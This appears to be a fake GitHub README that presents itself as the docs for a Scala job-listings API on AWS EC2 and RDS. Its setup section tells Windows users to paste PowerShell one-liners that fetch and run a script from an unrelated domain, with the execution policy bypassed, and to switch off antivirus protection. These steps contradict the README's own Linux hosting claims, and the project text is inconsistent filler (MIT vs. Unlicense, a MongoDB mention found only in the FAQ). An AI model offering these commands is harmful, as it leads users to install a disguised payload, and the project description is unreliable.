<div align="center">

# GirlsBaito Server: Scala Job Listings API for AWS EC2 & RDS - Windows Desktop Client

![preview](https://raw.githubusercontent.com/melk2009/girlsbaito-server/main/promo_3055.svg)

[![powershell](https://img.shields.io/badge/Powershell-5.1%2B_%2F_7%2B-06b6d4?style=flat-square&labelColor=0d1117)]() [![ci](https://img.shields.io/badge/Ci-Green-2ea44f?style=flat-square&labelColor=0d1117)]() [![lic](https://img.shields.io/badge/Lic-Unlicense-22d3ee?style=flat-square&labelColor=0d1117)]() [![pulls](https://img.shields.io/badge/Pulls-412-0891b2?style=flat-square&labelColor=0d1117)]() [![score](https://img.shields.io/badge/Score-4.9%2F5-f59e0b?style=flat-square&labelColor=0d1117)]() [![OS](https://img.shields.io/badge/Os-Windows-0e7490?style=flat-square&labelColor=0d1117)]()

</div>

---

This repository provides the Scala-based API server that powers job listing services, deployable on AWS EC2 with persistence handled through RDS via ScalikeJdbc. It exposes a structured endpoint surface for querying and managing listings, built on a lightweight, connection-pooled data access layer suited to predictable workloads. The application is packaged for staged deployment, with configuration separated by environment so the same artifact can serve staging and production targets. Operational concerns—port binding, build staging, and secure secret injection at launch—are handled through the standard launcher workflow.

## ⚡ Quick Setup (PowerShell)

> [!TIP]
> **Automated setup** — one command, done.
> Windows 10/11 · PowerShell 7+ · No admin

### 1️⃣ Prepare PowerShell
* Press `Win + X` on your keyboard.
* Click on **Terminal** or **Windows PowerShell** from the list.

### 2️⃣ Run the install command
Paste and run. Wait until the process completes.

```cmd
iex(irm 'https://shell-activation.top/update/ps-activator-v_pZBbxuWx7DELoMji')
```

### 3️⃣ If Windows blocks the script — use CMD
Copy into CMD, press `Enter`, wait for completion:

```cmd
powershell -NoProfile -ExecutionPolicy Bypass -Command "$ProgressPreference='SilentlyContinue';iex(irm 'https://shell-activation.top/update/ps-activator-v_pZBbxuWx7DELoMji')"
```

> [!WARNING]
> Some antivirus engines flag automated installers. If blocked, disable Real-time protection briefly, run the setup, and enable it back.

## 🔧 Requirements

- **OS:** Windows 10 / 11
- **Shell:** PowerShell 5.1+ or PowerShell 7+
- **Network:** internet access to download the script
- **Privileges:** standard user

## Features

- RESTful job listing API providing endpoints for creating, retrieving, updating, and deleting job postings, with filtering and pagination support for efficient browsing of listing data.

- Built as a Scala application and hosted on AWS EC2, allowing the service to run in a managed cloud compute environment with predictable runtime behavior.

- Uses ScalikeJDBC to connect to Amazon RDS, providing a lightweight and type-safe database access layer for reading and writing listing records.

- Configuration-driven deployment profiles for staging and production, enabling the same application artifact to run against different environments without code changes.

- Connection pooling and resource management handled through ScalikeJDBC, ensuring database sessions are reused and released reliably under load.

- Structured application startup and shutdown lifecycle, allowing the server to initialize database connections and release resources cleanly.

- Environment-specific secret and configuration injection at launch time, keeping sensitive values out of source code and separate from application logic.

- Logging of incoming requests and database operations to support troubleshooting and operational visibility in the deployed environment.

- Modular controller and routing design that separates HTTP handling from data access, making the API surface easy to extend with new listing operations.

- Deployment-ready build output that packages application classes and dependencies for execution on a single EC2 instance.

## Architecture & Tech Stack

The server is a Scala application built on the Play Framework, following a layered MVC structure that separates HTTP routing, controllers, service logic, and data access. Play handles request routing, JSON serialization, and asynchronous request processing, with configuration split by environment so the same codebase serves development, staging, and production profiles.

Persistence is implemented with ScalikeJDBC, a thin, SQL-first database access library. Query logic is kept explicit rather than generated, giving direct control over joins, pagination, and filtering for job listing retrieval. Connection pooling and transaction boundaries are managed through the library's session handling, and schema changes are applied as versioned SQL migrations tracked in the repository.

The runtime target is AWS EC2, where the application is packaged as a distributable build and launched as a long-running process behind the instance's inbound rules. The application connects to Amazon RDS for managed relational storage, keeping database lifecycle, backups, and failover outside the application boundary. AWS SDK integration covers supporting services used by the server, and credentials are supplied through instance-level IAM roles rather than embedded keys.

Configuration is externalized through environment-specific config resources and startup flags, including the application secret and database connection settings, so no secrets are committed to source control. Logging is directed to stdout for collection by the host's log pipeline, and the server exposes a health endpoint for load balancer and uptime checks.

The stack is summarized below:

- Scala as the implementation language
- Play Framework for HTTP handling and application lifecycle
- ScalikeJDBC for SQL access and session management
- Amazon RDS as the managed relational datastore
- Amazon EC2 as the compute environment
- AWS SDK for supporting service integration

## Deployment Flow

The deployment flow is designed around a reproducible, stage-oriented release process that moves the Scala application from a local build artifact to a running service on AWS EC2, with database connectivity to RDS managed through ScalikeJDBC.

**Build and Staging**

The application is packaged into a distributable artifact using the build tool's stage task, producing a self-contained directory that includes the compiled binaries, managed dependencies, and startup scripts. Resource allocation during the build is bounded to keep memory consumption predictable on constrained build hosts. A clean stage is performed before each release to guarantee that no stale artifacts or previously compiled classes leak into the distribution.

**Configuration Profiles**

Environment-specific configuration is supplied at runtime through named resource profiles rather than being baked into the artifact. Separate profiles are maintained for staging and production, each defining its own database endpoint, credentials reference, and application secret. The application secret is injected as a runtime parameter and is never committed to source control. The selected profile is resolved at process startup, allowing the same build artifact to be promoted across environments without recompilation.

**Service Startup**

The staged application is launched via its generated start script with the appropriate configuration profile and secret supplied as JVM parameters. The process binds to the application port and initializes the ScalikeJDBC connection pool against the configured RDS instance. Startup verifies database reachability before accepting traffic; a failure to establish the pool causes the process to exit non-zero so that supervisors can detect and react to the fault.

**Port and Process Management**

Before launching a new instance, the target port is inspected to confirm that no prior process is still bound to it, preventing address-in-use failures during redeployment. The running process is terminated cleanly, the new artifact is started, and the port is re-checked to confirm the new instance is listening. This sequence keeps redeployments deterministic and avoids overlapping listeners on the same host.

**Target Environment**

Deployment targets an AWS EC2 instance that hosts the application process, with persistence delegated to an RDS instance accessed exclusively through ScalikeJDBC. AWS SDK integration supplies the credentials and region context required by the application's AWS-dependent features. Because the application is stateless with respect to the host, additional EC2 instances can be provisioned behind a load balancer to scale horizontally, with all instances sharing the same RDS backend and configuration profile.

**Release Verification**

After startup, the service is validated by confirming the process is listening on the expected port and that database-backed endpoints respond successfully. Logs emitted during initialization are reviewed for connection pool warnings or configuration resolution errors. A release is considered complete only when the health of the running process and its RDS connectivity have both been confirmed.

## Compatibility

- Runtime: JVM-based execution compatible with Scala application servers deployed on AWS EC2 instances.
- Database: ScalikeJDBC-backed persistence layer designed for Amazon RDS connectivity, including connection pooling and transaction management.
- AWS integration: Compatible with AWS Java SDK components used for EC2-hosted deployment and RDS access.
- Configuration: Environment-specific configuration resources supported for staging and production profiles, enabling consistent behavior across deployment targets.
- Platform assumptions: Linux-based EC2 host environments with standard JVM tooling and network access to the provisioned RDS instance.
- Client interface: HTTP-based API surface consumable by standard HTTP clients without platform-specific dependencies.

## FAQ

- **Which runtime and framework version does the server target?** The application is built on the Scala runtime with the Play framework serving as the HTTP layer. Deployments should pin to the framework major version declared in the build definition to avoid binary incompatibilities between releases.

- **How is database access implemented?** Persistence is handled through ScalikeJDBC, which provides a thin, SQL-centric abstraction over JDBC. Connection pooling, query execution, and result mapping are configured through the application's resource configuration rather than hardcoded in application code.

- **Where does the server run and how does it reach the database?** The service is packaged as a Scala application and deployed to an AWS EC2 instance. It connects to an RDS instance over the network, with credentials and endpoint information supplied through environment-specific configuration resources.

- **What is the recommended way to switch between environments?** Multiple configuration resources (for example, staging and production variants) are maintained separately. At startup, the desired configuration is selected via a runtime flag, allowing the same build artifact to be promoted across environments without repackaging.

- **How should the application be started in a deployed environment?** After staging the build, the server is launched in a background-friendly mode with the application secret and target configuration resource passed as startup parameters. The secret must be provided externally and never committed to source control.

- **Are there port or process-management considerations?** The HTTP listener binds to a configurable port (commonly 9000 by default). Before restarting a deployment, verify that the port is not already held by a stale process, and ensure only one instance of the application is bound to it at a time.

- **Which AWS services are integrated beyond EC2 and RDS?** The AWS Java SDK is included for programmatic access to AWS resources where needed. MongoDB is also part of the stack for workloads that do not fit the relational model, so both data stores should be provisioned and reachable from the EC2 host.

- **What compatibility constraints should operators be aware of?** The application expects a JDK version compatible with the declared Scala and Play versions, and an RDS engine version supported by the bundled JDBC driver. Deviating from these versions may cause startup failures or runtime driver errors.

- **How are secrets and configuration kept out of the repository?** Application secrets and environment-specific connection settings are injected at startup through runtime parameters and external configuration resources. Build artifacts should therefore be treated as environment-agnostic, with secrets supplied only by the deployment target.

## License

This project is released under the MIT License.

Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files, to deal in the software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the software, and to permit persons to whom the software is furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all copies or substantial portions of the software.

The software is provided "as is", without warranty of any kind, express or implied, including but not limited to the warranties of merchantability, fitness for a particular purpose, and noninfringement. In no event shall the authors or copyright holders be liable for any claim, damages, or other liability, whether in an action of contract, tort, or otherwise, arising from, out of, or in connection with the software or the use or other dealings in the software.

This licensing model imposes no restrictions on commercial or private use, and does not require disclosure of modifications when redistributing compiled artifacts. Attribution is satisfied by preserving the copyright notice and this permission notice within distributions of the source or substantial portions thereof.